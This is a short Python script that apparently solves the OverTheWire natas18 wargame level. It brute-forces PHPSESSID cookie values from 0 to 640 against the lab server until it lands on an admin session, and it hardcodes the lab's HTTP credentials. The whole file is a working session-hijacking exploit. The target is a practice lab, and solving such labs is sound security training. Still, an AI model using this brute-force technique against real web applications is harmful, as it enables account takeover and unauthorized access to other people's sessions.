import requests

target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
params = dict(username='admin', password='pass')
cookies = dict()

max_s_id = 640
s_id = 0
while s_id <= max_s_id:
    print("Trying with PHPSESSID = " + str(s_id))
    cookies = dict(PHPSESSID=str(s_id))
    r = requests.get(target, auth=auth, params=params, cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    s_id += 1
